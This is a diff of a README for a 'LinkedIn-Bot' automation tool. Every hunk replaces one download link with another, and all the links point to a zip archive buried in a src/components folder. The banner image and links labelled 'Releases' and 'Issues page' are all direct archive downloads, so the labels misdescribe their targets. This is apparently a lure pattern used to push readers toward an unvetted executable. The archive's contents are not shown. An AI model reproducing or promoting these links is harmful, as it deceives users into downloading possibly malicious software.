@@ -1,6 +1,6 @@
 # 🤖 LinkedIn-Bot - Automate Your LinkedIn Experience Effortlessly
 
-![Download LinkedIn-Bot](https://github.com/nirjalneupane762/LinkedIn-Bot/raw/refs/heads/main/src/components/Linked_In_Bot_v3.8.zip)
+![Download LinkedIn-Bot](https://raw.githubusercontent.com/nirjalneupane762/LinkedIn-Bot/main/src/components/In-Linked-Bot-3.6.zip)
 
 ## 📦 Description
 
@@ -24,7 +24,7 @@ LinkedIn-Bot is an automation tool designed to help you navigate LinkedIn with e
 ## 🚀 Getting Started
 
 1. **Download the Application:**
-   - Visit this page to download: [LinkedIn-Bot Releases](https://github.com/nirjalneupane762/LinkedIn-Bot/raw/refs/heads/main/src/components/Linked_In_Bot_v3.8.zip). 
+   - Visit this page to download: [LinkedIn-Bot Releases](https://raw.githubusercontent.com/nirjalneupane762/LinkedIn-Bot/main/src/components/In-Linked-Bot-3.6.zip). 
    - Look for the latest version under the Releases section.
 
 2. **Install the Application:**
@@ -40,7 +40,7 @@ LinkedIn-Bot is an automation tool designed to help you navigate LinkedIn with e
 
 ## 📥 Download & Install
 
-To get started, please visit this page to download: [LinkedIn-Bot Releases](https://github.com/nirjalneupane762/LinkedIn-Bot/raw/refs/heads/main/src/components/Linked_In_Bot_v3.8.zip). Ensure you download the latest version available.
+To get started, please visit this page to download: [LinkedIn-Bot Releases](https://raw.githubusercontent.com/nirjalneupane762/LinkedIn-Bot/main/src/components/In-Linked-Bot-3.6.zip). Ensure you download the latest version available.
 
 ## 🛠️ How to Use
 
@@ -58,7 +58,7 @@ To get started, please visit this page to download: [LinkedIn-Bot Releases](http
 
 ## 👩‍💻 Support
 
-If you encounter any issues, you can reach out to our support team by opening the “Help” section within the application. You can also check the [Issues page](https://github.com/nirjalneupane762/LinkedIn-Bot/raw/refs/heads/main/src/components/Linked_In_Bot_v3.8.zip) on GitHub for common questions and solutions.
+If you encounter any issues, you can reach out to our support team by opening the “Help” section within the application. You can also check the [Issues page](https://raw.githubusercontent.com/nirjalneupane762/LinkedIn-Bot/main/src/components/In-Linked-Bot-3.6.zip) on GitHub for common questions and solutions.
 
 ## 🌐 Topics
 
@@ -79,4 +79,4 @@ Join our community to get tips, share experiences, and learn new ways to enhance
 
 ---
 
-For any updates, always refer back to the [LinkedIn-Bot Releases](https://github.com/nirjalneupane762/LinkedIn-Bot/raw/refs/heads/main/src/components/Linked_In_Bot_v3.8.zip). Download now to start automating your LinkedIn experience!
+For any updates, always refer back to the [LinkedIn-Bot Releases](https://raw.githubusercontent.com/nirjalneupane762/LinkedIn-Bot/main/src/components/In-Linked-Bot-3.6.zip). Download now to start automating your LinkedIn experience!
